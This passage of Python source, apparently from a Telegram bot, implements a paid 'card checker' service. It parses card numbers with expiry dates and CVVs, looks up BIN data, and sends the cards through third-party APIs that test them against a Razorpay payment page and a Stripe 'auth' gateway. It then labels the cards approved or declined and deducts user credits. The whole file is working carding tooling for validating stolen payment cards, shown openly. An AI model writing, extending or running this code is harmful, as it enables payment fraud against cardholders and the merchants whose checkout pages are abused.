        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4169161410569379|12/16|931
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4169161410569379|12/16/931
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4169161410569379:12|16|931
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4169161410569379:12|16/931
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4169161410569379:12/16|931
        r'^(\d{13,19}):(\d{1,2})\/(\d{2,4})\|(\d{3,4})$',
    ]
    
    for pattern in patterns:
        match = re.match(pattern, card_string)
        if match:
            card_number, month, year, cvv = match.groups()
            
            # Normalize month (ensure it's 2 digits)
            month = month.zfill(2)
            
            # Normalize year (if it's 4 digits, take last 2)
            if len(year) == 4:
                year = year[2:]
            
            return card_number, month, year, cvv
    
    return None

def rz_extract_card_from_text(text: str) -> Optional[str]:
    """
    Extract card details from a text message using various patterns.
    
    Args:
        text: The text to search for card details
        
    Returns:
        String containing card details in format "card|mm|yy|cvv" or None if not found
    """
    # Patterns to find card details in any text
    patterns = [
        # Pattern: 4296190000711410|08|30|545
        r'(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410/08/30/545
        r'(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4296190000711410:08:30:545
        r'(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})',
        # Pattern: 4296190000711410/08|30|545
        r'(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410|08/30/545
        r'(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4296190000711410:08|30|545
        r'(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410|08:30:545
        r'(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})',
        # Pattern: 4296190000711410 08 30 545
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
        # Pattern: 4169161410569379/12|16|931
        r'(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4169161410569379/12|16/931
        r'(\d{13,19})\/(\d{1,2})\|(\d{2,4})\/(\d{3,4})',
        # Pattern: 4169161410569379/12/16/931
        r'(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4169161410569379|12/16|931
        r'(\d{13,19})\|(\d{1,2})\/(\d{2,4})\|(\d{3,4})',
        # Pattern: 4169161410569379|12/16/931
        r'(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4169161410569379:12|16|931
        r'(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4169161410569379:12|16/931
        r'(\d{13,19}):(\d{1,2})\|(\d{2,4})\/(\d{3,4})',
        # Pattern: 4169161410569379:12/16|931
        r'(\d{13,19}):(\d{1,2})\/(\d{2,4})\|(\d{3,4})',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            card_number, month, year, cvv = match.groups()
            
            # Normalize month (ensure it's 2 digits)
            month = month.zfill(2)
            
            # Normalize year (if it's 4 digits, take last 2)
            if len(year) == 4:
                year = year[2:]
            
            return f"{card_number}|{month}|{year}|{cvv}"
    
    return None

def rz_get_random_proxy() -> str:
    """Get a random proxy from list."""
    return random.choice(PROXIES)

async def rz_check_card(card_details: str, user_info: Dict) -> Optional[str]:
    """
    Check card details using Razorpay API asynchronously with aiohttp.
    Implements retry logic with up to 3 attempts if a request fails.
    
    Args:
        card_details: String containing card details in various formats
        user_info: Dictionary containing user information
        
    Returns:
        Formatted response string or None if there was an error
    """
    # Parse card details
    parsed = rz_parse_card_details(card_details)
    if not parsed:
        return "⚠️ <b>Missing card details!</b>\n\n<i>Usage: /rz card|mm|yy|cvv</i>"
    
    card_number, month, year, cvv = parsed
    
    # Get BIN information using the imported function
    bin_number = card_number[:6]
    bin_details = await get_bin_info(bin_number)
    brand = (bin_details.get("scheme") or "N/A").title()
    issuer = bin_details.get("bank") or "N/A"
    country_name = bin_details.get("country") or "Unknown"
    country_flag = bin_details.get("country_emoji", "")
    
    # Initialize variables for retry logic
    max_retries = 3
    retry_count = 0
    last_error = None
    api_response = None
    
    # Retry loop
    while retry_count < max_retries:
        try:
            # Get a random proxy for each attempt
            proxy = rz_get_random_proxy()
            
            url = f"{API_URL}?cc={card_number}|{month}|{year}|{cvv}&site=https://pages.razorpay.com/pl_J1vTgGrsLKbLWy/view&amount=10&proxy="

            loop = asyncio.get_event_loop()
            def make_request():
                try:
                    scraper = cloudscraper.create_scraper()
                    return scraper.get(url, timeout=100)
                except Exception as e:
                    return e

            res = await loop.run_in_executor(None, make_request)

            if isinstance(res, Exception):
                api_response = {"status": "Error", "message": str(res)[:150]}
            elif res.status_code != 200:
                api_response = {"status": "Error", "message": f"HTTP {res.status_code}"}
            else:
                try:
                    api_response = res.json()
                except Exception:
                    api_response = {"status": "Error", "message": html.escape(res.text[:150])}
            
            # If we got a successful response, break out of the retry loop
            break
            
        except Exception as e:
            logger.error(f"Error checking card (attempt {retry_count + 1}): {e}")
            last_error = str(e)
            retry_count += 1
            
            # If this is not the last attempt, wait a bit before retrying
            if retry_count < max_retries:
                await asyncio.sleep(1)  # Wait 1 second before retrying
    
    # If all retries failed, return an error message
    if api_response is None:
        return f"⚠️ <b>Error checking card after {max_retries} attempts:</b> <code>{last_error}</code>"
    
    # Format and return the response
    return rz_format_response(api_response, user_info, card_details, brand, issuer, country_name, country_flag)

def rz_format_response(api_response: Dict, user_info: Dict, card_details: str, 
                   brand: str, issuer: str, country_name: str, country_flag: str) -> str:
    """
    Format the API response into a beautiful message with emojis.
    Implements specific status logic based on response content.
    
    Args:
        api_response: Dictionary containing the API response
        user_info: Dictionary containing user information
        card_details: Full card details string
        brand: Card brand from BIN lookup
        issuer: Bank name from BIN lookup
        country_name: Country name from BIN lookup
        country_flag: Country emoji from BIN lookup
        
    Returns:
        Formatted string with emojis
    """
    card = api_response.get("card", "N/A")
    message = html.escape(str(api_response.get("message", "N/A")))
    reason = html.escape(str(api_response.get("reason", "")))
    status = api_response.get("status", "N/A")
    payment_id = api_response.get("payment_id", "")
    
    response_display = f"{message} ({reason})" if reason else message
    
    # Determine status based on message content with stylish formatting
    status_emoji = "❓"
    status_text = status
    status_style = ""
    
    check_text = f"{message} {reason}".lower()
    
    if "insufficient_funds" in check_text:
        status_emoji = "✅"
        status_text = "𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙/𝘾𝙝𝙖𝙧𝙜𝙚"
        status_style = f"<b>{status_text}</b> {status_emoji}"
    elif any(kw in check_text for kw in ["decline", "bank_technical_error", "payment_risk_check_failed", "3d", "3ds", "secure", "verification"]):
        status_emoji = "❌"
        status_text = "𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙"
        status_style = f"<b>{status_text}</b> {status_emoji}"
    elif any(kw in check_text for kw in ["thank", "success", "succeeded", "approved", "charged", "completed"]):
        status_emoji = "✅"
        status_text = "𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙/𝘾𝙝𝙖𝙧𝙜𝙚"
        status_style = f"<b>{status_text}</b> {status_emoji}"
    else:
        status_style = f"{status_emoji} <b>{status_text}</b>"
    
    # Get user info
    user_id = user_info.get("id", "Unknown")
    username = user_info.get("username", "")
    first_name = html.escape(user_info.get("first_name", "User"))
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    
    # Create user link with profile name hyperlinked (as requested)
    user_link = f"<a href='tg://user?id={user_id}'>{first_name}</a> <code>[{user_tier}]</code>"
    
    # Format the response with the exact structure requested
    status_part = f"""<pre><a href='https://t.me/rev3rsex'>⩙</a> <b>𝑺𝒕𝒂𝒕𝒖𝒔</b> ↬ {status_style}</pre>"""
    
    bank_part = f"""<pre><b>𝑩𝒓𝒂𝒏𝒌</b> ↬ <code>{brand}</code>
<b>𝑩𝒂𝒏𝒌</b> ↬ <code>{issuer}</code>
<b>𝑪𝒐𝒖𝒏𝒕𝒓𝒚</b> ↬ <code>{country_name} {country_flag}</code></pre>"""
    
    card_part = f"""<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐂𝐚𝐫𝐝</b>
⤷ <code>{card_details}</code>"""
    
    # Combine all parts
    formatted_response = f"""{status_part}
{card_part}
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ↬ <i>𝗥𝗮𝘇𝗼𝗿𝗽𝗮𝘆 1₹</i>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ↬ <code>{response_display}</code>
{bank_part}
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐔𝐬𝐞𝐫</b> ↬ {user_link} 
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐃𝐞𝐯</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>"""
    
    return formatted_response

# This function will be called from main.py
async def handle_rz_command(update, context):
    """
    Handle the /rz command with user-specific cooldown for Trial users.
    Can also be used as a reply to a message containing card details.
    
    Args:
        update: Telegram update object
        context: Telegram context object
    """
    # Get user info
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    
    # Check cooldown for Free users (user-specific)
    current_time = datetime.now()
    
    # Apply cooldown to both Trial and Free users
    if user_tier in ["Trial", "Free"] and user_id in last_command_time:
        time_diff = current_time - last_command_time[user_id]
        if time_diff < timedelta(seconds=10):
            remaining_seconds = 10 - int(time_diff.total_seconds())
            await update.message.reply_text(
                f"⏳ <b>Please wait {remaining_seconds} seconds before using this command again.</b>\n\n"
                f"<i>Upgrade your plan to remove the time limit.</i>",
                parse_mode="HTML"
            )
            return
    
    # Try to get card details from command arguments
    card_details = None
    
    # First check if arguments are provided
    if context.args:
        card_details = " ".join(context.args)
    # If no arguments, check if this is a reply to a message
    elif update.message.reply_to_message:
        # Try to extract card details from the replied message
        replied_text = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
        card_details = rz_extract_card_from_text(replied_text)
    
    # If still no card details, show usage
    if not card_details:
        await update.message.reply_text(
            "⚠️ <b>Missing card details!</b>\n\n"
            "<i>Usage 1: /rz card|mm|yy|cvv</i>\n"
            "<i>Usage 2: Reply to a message containing card details with /rz</i>", 
            parse_mode="HTML"
        )
        return
    
    # Get user credits BEFORE processing the card
    user_credits = get_user_credits(user_id)
    
    # Check if user has enough credits (or unlimited)
    is_unlimited = user_credits == float('inf')
    has_credits = user_credits is not None and (is_unlimited or user_credits > 0)
    
    # If user has no credits (and not unlimited), show warning and stop
    if not has_credits:
        await update.message.reply_text(
            f"""<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙒𝙖𝙧𝙣𝙞𝙣𝙜:</b> <i>You have 0 credits left.</i>

<a href='https://t.me/rev3rsex'>💳</a> <b>Please recharge to continue using this service.</b>

<a href='https://t.me/rev3rsex'>📊</a> <b>Current Plan:</b> <code>{user_tier}</code>
<a href='https://t.me/rev3rsex'>💰</a> <b>Credits:</b> <code>0</code>""",
            parse_mode="HTML"
        )
        return
    
    # Create progress message
    progress_msg = f"""<pre>🔄 <b>𝗣𝗿𝗼𝗰𝗲𝘀𝗶𝗻𝗴 𝗥𝗲𝗾𝘂𝗲𝘀𝘁...</b></pre>
<pre>{card_details}</pre>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↬ <i>𝗥𝗮𝘇𝗼𝗿𝗽𝗮𝘆 1₹</i>"""
    
    # Send the progress message
    checking_message = await update.message.reply_text(progress_msg, parse_mode="HTML")
    
    # Prepare user info
    user_info = {
        "id": user_id,
        "username": username,
        "first_name": first_name
    }
    
    # Update the last command time for Free/Trial users immediately
    if user_tier in ["Trial", "Free"]:
        last_command_time[user_id] = current_time
    
    # Create a background task for the card check to avoid blocking
    async def background_check():
        try:
            # Run the asynchronous card check
            result = await rz_check_card(card_details, user_info)
            
            # Deduct 1 credit if the response was successful and user doesn't have unlimited credits
            if result and not result.startswith("⚠️ <b>Missing card details!</b>") and not result.startswith("⚠️ <b>Error checking card:</b>"):
                # Only deduct credits if the user doesn't have unlimited
                if not is_unlimited:
                    # Deduct 1 credit in the background
                    update_user_credits(user_id, -1)
                    
                    # Get updated credits for the response
                    updated_credits = get_user_credits(user_id)
                    
                    # Add warning if credits are now 0
                    if updated_credits is not None and updated_credits <= 0:
                        # Add warning message at the end of the result
                        result = result + f"\n\n<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙒𝙖𝙧𝙣𝙞𝙣𝙜:</b> <i>You have 0 credits left. Please recharge to continue using this service.</i>"
            
            # Edit the checking message with the result
            await checking_message.edit_text(result, parse_mode="HTML")
        except Exception as e:
            logger.error(f"Error in background check: {e}")
            error_msg = f"⚠️ <b>Error:</b> <code>{str(e)}</code>"
            await checking_message.edit_text(error_msg, parse_mode="HTML")
    
    # Schedule the background task without awaiting it to avoid blocking
    asyncio.create_task(background_check())

# Also add a handler for /rzz command as an alias
async def handle_rzz_command(update, context):
    """
    Handle the /rzz command as an alias for /rz.
    
    Args:
        update: Telegram update object
        context: Telegram context object
    """
    # Just call the rz handler
    await handle_rz_command(update, context)



# ============================================================
# MODULE: au
# ============================================================
# Configure logging

# Create a thread pool executor for background tasks
executor = ThreadPoolExecutor(max_workers=100)

# Dictionary to store last command time for each user (for cooldown)
last_command_time = {}

# Define approved and CCN patterns for response parsing
approved_patterns = [
    'Payment Status : Approved',
    'Payment method successfully added.',
    'Insufficient Funds',
    'Gateway Rejected: avs',
    'Duplicate',
    'Payment method added successfully',
    'Invalid postal code or street address',
    'You cannot add a new payment method so soon after the previous one. Please wait for 20 seconds',
    'succeeded',
    'setup_intent'
]

CCN_patterns = [
    'CVV',
    'Gateway Rejected: avs_and_cvv',
    'Card Issuer Declined CVV',
    'Gateway Rejected: cvv',
    "Your card's security code is incorrect"
]

def au_luhn_check(card_number: str) -> bool:
    """
    Validate a credit card number using the Luhn algorithm.
    
    Args:
        card_number: The credit card number to validate
        
    Returns:
        True if the card number is valid, False otherwise
    """
    # Remove any spaces or dashes from the card number
    card_number = card_number.replace(' ', '').replace('-', '')
    
    # Check if the card number contains only digits
    if not card_number.isdigit():
        return False
    
    # Check if the card number has a valid length (13-19 digits)
    if len(card_number) < 13 or len(card_number) > 19:
        return False
    
    # Convert the card number to a list of integers
    digits = [int(d) for d in card_number]
    
    # Starting from the rightmost digit, double every second digit
    # If doubling results in a two-digit number, sum the digits
    for i in range(len(digits) - 2, -1, -2):
        digits[i] = digits[i] * 2
        if digits[i] > 9:
            digits[i] = digits[i] % 10 + 1
    
    # Sum all the digits
    total = sum(digits)
    
    # If the total is a multiple of 10, the card number is valid
    return total % 10 == 0

def au_get_credit_card_details(card_string):
    """Parse card details from various formats"""
    # Remove any extra spaces
    card_string = card_string.strip()
    
    # Try different patterns
    patterns = [
        # Pattern: 4296190000711410|08|30|545
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410/08/30/545
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4296190000711410:08:30:545
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 4296190000711410/08|30|545
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410|08/30/545
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4296190000711410:08|30|545
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410|08:30:545
        r'^(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 4296190000711410 08 30 545
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
    ]
    
    for pattern in patterns:
        match = re.match(pattern, card_string)
        if match:
            card_number, month, year, cvv = match.groups()
            
            # Normalize month (ensure it's 2 digits)
            month = month.zfill(2)
            
            # Normalize year (if it's 4 digits, take last 2)
            if len(year) == 4:
                year = year[2:]
            
            return {
                'number': card_number.replace(' ', ''),  # Remove spaces if any
                'exp_month': month,
                'exp_year': year,
                'cvc': cvv
            }
    
    return None

def au_parse_card_details(card_string: str) -> Optional[Tuple[str, str, str, str]]:
    """
    Parse card details from various formats.
    
    Args:
        card_string: String containing card details in various formats
        
    Returns:
        Tuple of (card_number, month, year, cvv) or None if parsing failed
    """
    # Remove any extra spaces
    card_string = card_string.strip()
    
    # Try different patterns
    patterns = [
        # Pattern: 4296190000711410|08|30|545
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410/08/30/545
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4296190000711410:08:30:545
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 4296190000711410/08|30|545
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410|08/30/545
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4296190000711410:08|30|545
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410|08:30:545
        r'^(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 4296190000711410 08 30 545
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
    ]
    
    for pattern in patterns:
        match = re.match(pattern, card_string)
        if match:
            card_number, month, year, cvv = match.groups()
            
            # Normalize month (ensure it's 2 digits)
            month = month.zfill(2)
            
            # Normalize year (if it's 4 digits, take last 2)
            if len(year) == 4:
                year = year[2:]
            
            return card_number, month, year, cvv
    
    return None

def au_extract_card_from_text(text: str) -> Optional[str]:
    """
    Extract card details from a text message using various patterns.
    
    Args:
        text: The text to search for card details
        
    Returns:
        String containing card details in format "card|mm|yy|cvv" or None if not found
    """
    # Patterns to find card details in any text
    patterns = [
        # Pattern: 4296190000711410|08|30|545
        r'(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410/08/30/545
        r'(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4296190000711410:08:30:545
        r'(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})',
        # Pattern: 4296190000711410/08|30|545
        r'(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410|08/30/545
        r'(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4296190000711410:08|30|545
        r'(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410|08:30:545
        r'(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})',
        # Pattern: 4296190000711410 08 30 545
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            card_number, month, year, cvv = match.groups()
            
            # Normalize month (ensure it's 2 digits)
            month = month.zfill(2)
            
            # Normalize year (if it's 4 digits, take last 2)
            if len(year) == 4:
                year = year[2:]
            
            return f"{card_number}|{month}|{year}|{cvv}"
    
    return None

async def check_card_with_stripe_auth(card_details: str, user_info: Dict) -> Optional[Dict]:
    """
    Check card details using the Stripe Auth API.
    
    Args:
        card_details: String containing card details in various formats
        user_info: Dictionary containing user information
        
    Returns:
        Dictionary with card details and API response or None if there was an error
    """
    # Parse card details
    parsed = au_parse_card_details(card_details)
    if not parsed:
        return {
            "card_details": card_details,
            "error": "Invalid card format"
        }
    
    card_number, month, year, cvv = parsed
    
    # Validate the card number using Luhn algorithm (Fallback check)
    if not au_luhn_check(card_number):
        return {
            "card_details": card_details,
            "error": "Invalid card number (failed Luhn check)"
        }
    
    # Get BIN information using the imported function
    bin_number = card_number[:6]
    bin_details = await get_bin_info(bin_number)
    brand = (bin_details.get("scheme") or "N/A").title()
    issuer = bin_details.get("bank") or "N/A"
    country_name = bin_details.get("country") or "Unknown"
    country_flag = bin_details.get("country_emoji", "")
    
    # Prepare the API URL with the card details
    # Format the card details for the API
    formatted_card = f"{card_number}|{month}|{year}|{cvv}"
    
    # UPDATED API URL
    api_url = f"{STRIPE_AUTH_API_URL}/gateway=autostripe/key=Blackxcard/site=kabusvuya.com/cc={formatted_card}"
    
    try:
        # Create a session for the request
        timeout = aiohttp.ClientTimeout(total=60)
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
        }
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(api_url, headers=headers) as response:
                try:
                    api_response = await response.json()
                except Exception:
                    text = await response.text()
                    return {
                        "card_details": card_details,
                        "error": f"API error ({response.status}): {text[:100]}"
                    }
                
                if not api_response:
                    return {
                        "card_details": card_details,
                        "error": "Empty response from API"
                    }
                
                # Extract response fields
                # Based on example: {"response":"Succeeded","status":"Approved","message":"Payment method added successfully","Dev":"@Mod_By_Kamal"}
                status = api_response.get("status", "unknown")
                
                # Prioritize 'message' field as it contains the readable text, fallback to 'response'
                message = api_response.get("response", api_response.get("message", "No response message"))
                
                return {
                    "card_details": card_details,
                    "card_number": card_number,
                    "month": month,
                    "year": year,
                    "cvv": cvv,
                    "api_response": {
                        "status": status,
                        "response": message
                    },
                    "brand": brand,
                    "issuer": issuer,
                    "country": country_name,
                    "country_flag": country_flag
                }
    
    except asyncio.TimeoutError:
        return {
            "card_details": card_details,
            "error": "Request timed out. Please try again."
        }
    except aiohttp.ClientError:
        return {
            "card_details": card_details,
            "error": "Network error. Please try again."
        }
    except Exception:
        return {
            "card_details": card_details,
            "error": "An unexpected error occurred. Please try again."
        }

def au_format_response_stripe_auth(result: dict, user_info: dict) -> Tuple[str, str]:
    """
    Format the API response into a beautiful message with emojis for Stripe Auth.
    
    Args:
        result: Dictionary containing API response
        user_info: Dictionary containing user information
        
    Returns:
        Tuple of (formatted string, status category)
    """
    if "error" in result:
        error_msg = result.get('error', 'Unknown error')
        
        # Create a more visually appealing error message
        formatted_error = f"""<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙀𝙧𝙧𝙤𝙧 𝘿𝙚𝙩𝙚𝙘𝙩𝙚𝙙</b> ⚠️

<a href='https://t.me/rev3rsex'>💳</a> <b>𝘾𝙖𝙧𝙙:</b> <code>{result.get('card_details', 'Unknown')}</code>

<a href='https://t.me/rev3rsex'>📝</a> <b>𝙍𝙚𝙖𝙨𝙤𝙣:</b> <i>{error_msg}</i>

<a href='https://t.me/rev3rsex'>💡</a> <b>𝙏𝙞𝙥:</b> <i>Please check your card details and try again.</i>"""
        
        return formatted_error, "error"
    
    api_response = result.get("api_response", {})
    card_details = result.get("card_details", "")
    brand = result.get("brand", "N/A")
    issuer = result.get("issuer", "N/A")
    country_name = result.get("country", "Unknown")
    country_flag = result.get("country_flag", "")
    
    # Extract response fields
    status = api_response.get("status", "")
    
    # UPDATED: Prioritize 'message' if available (from new API), fallback to 'response' (old API)
    # Note: The internal dictionary key in result['api_response'] is stored as 'response' in check_card_with_stripe_auth
    message = api_response.get("response", api_response.get("message", "No response message"))
    
    # Determine status style based on status content
    status_lower = status.lower()
    if status_lower == "approved" or status_lower == "succeeded":
        status_style = "<b>𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿</b> ✅"
        status_category = "approved"
    elif status_lower == "declined":
        status_style = "<b>𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿</b> ❌"
        status_category = "declined"
    else:
        status_style = "<b>𝙀𝙍𝙍𝙊𝙍</b> ⚠️"
        status_category = "error"
        
    # Get user info
    user_id = user_info.get("id", "Unknown")
    username = user_info.get("username", "")
    first_name = html.escape(user_info.get("first_name", "User"))
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    
    # Create user link with profile name hyperlinked (as requested)
    user_link = f"<a href='tg://user?id={user_id}'>{first_name}</a> <code>[{user_tier}]</code>"
    
    # Format the response with the exact structure requested
    status_part = f"""<pre><a href='https://t.me/rev3rsex'>⩙</a> <b>𝑺𝒕𝒂𝒕𝒖𝒔</b> ↬ {status_style}</pre>"""
    
    bank_part = f"""<pre><b>𝑩𝒓𝒂𝒏𝒌</b> ↬ <code>{brand}</code>
<b>𝑩𝒓𝒂𝒏𝒌</b> ↬ <code>{issuer}</code>
<b>𝑪𝒐𝒖𝒏𝒕𝒓𝒚</b> ↬ <code>{country_name} {country_flag}</code></pre>"""
    
    card_part = f"""<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐂𝐚𝐫𝐝</b>
⤷ <code>{card_details}</code>"""
    
    # Combine all parts
    formatted_response = f"""{status_part}
{card_part}
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ↬ <i>𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵</i>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ↬ <code>{message}</code>
{bank_part}
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐔𝐬𝐞𝐫</b> ↬ {user_link} 
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐃𝐞𝐯</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>"""
    
    return formatted_response, status_category

# This function will be called from main.py
async def handle_au_command(update, context):
    """
    Handle the /au command with user-specific cooldown for Trial users.
    Can also be used as a reply to a message containing card details.
    
    Args:
        update: Telegram update object
        context: Telegram context object
    """
    # Get user info
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    
    # Check cooldown for Free users (user-specific)
    current_time = datetime.now()
    
    # Apply cooldown to both Trial and Free users
    if user_tier in ["Trial", "Free"] and user_id in last_command_time:
        time_diff = current_time - last_command_time[user_id]
        if time_diff < timedelta(seconds=10):
            remaining_seconds = 10 - int(time_diff.total_seconds())
            await update.message.reply_text(
                f"⏳ <b>Please wait {remaining_seconds} seconds before using this command again.</b>\n\n"
                f"<i>Upgrade your plan to remove the time limit.</i>",
                parse_mode="HTML"
            )
            return
    
    # Try to get card details from command arguments
    card_details = None
    
    # First check if arguments are provided
    if context.args:
        card_details = " ".join(context.args)
    # If no arguments, check if this is a reply to a message
    elif update.message.reply_to_message:
        # Try to extract card details from the replied message
        replied_text = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
        card_details = au_extract_card_from_text(replied_text)
    
    # If still no card details, show usage
    if not card_details:
        await update.message.reply_text(
            """<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙈𝙞𝙨𝙨𝙞𝙣𝙜 𝘾𝙖𝙧𝙙 𝘿𝙚𝙩𝙖𝙞𝙡𝙨</b>

<a href='https://t.me/rev3rsex'>📝</a> <b>𝙐𝙨𝙖𝙜𝙚 𝙊𝙥𝙩𝙞𝙤𝙣𝙨:</b>

<i>1️⃣ Direct command:</i>
<code>/au 4242424242424242|12|25|123</code>

<i>2️⃣ Reply to message:</i>
Reply to any message containing card details with <code>/au</code>

<a href='https://t.me/rev3rsex'>💡</a> <b>𝙎𝙪𝙥𝙥𝙤𝙧𝙩𝙚𝙙 𝙁𝙤𝙧𝙢𝙖𝙩𝙨:</b>
<code>card|mm|yy|cvv</code>
<code>card/mm/yy/cvv</code>
<code>card:mm:yy:cvv</code>""",
            parse_mode="HTML"
        )
        return

    # ==============================
    # IMMEDIATE VALIDATION (LUHN CHECK)
    # ==============================
    # We parse and validate BEFORE checking credits or showing "Processing"
    # This provides better UX and saves API requests
    parsed = au_parse_card_details(card_details)
    
    if not parsed:
        await update.message.reply_text(
            """<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙁𝙤𝙧𝙢𝙖𝙩</b>

<i>Could not parse card details. Please ensure the format is correct.</i>""",
            parse_mode="HTML"
        )
        return
    
    card_number, month, year, cvv = parsed
    
    # Perform Luhn Check immediately
    if not au_luhn_check(card_number):
        await update.message.reply_text(
            """<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝘾𝙖𝙧𝙙</b>

<i>Card number failed Luhn validation (Check sum error).</i>""",
            parse_mode="HTML"
        )
        return
    # ==============================

    # Get user credits BEFORE processing the card
    user_credits = get_user_credits(user_id)
    
    # Check if user has enough credits (or unlimited)
    is_unlimited = user_credits == float('inf')
    has_credits = user_credits is not None and (is_unlimited or user_credits > 0)
    
    # If user has no credits (and not unlimited), show warning and stop
    if not has_credits:
        await update.message.reply_text(
            f"""<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙒𝙖𝙧𝙣𝙞𝙣𝙜:</b> <i>You have 0 credits left.</i>

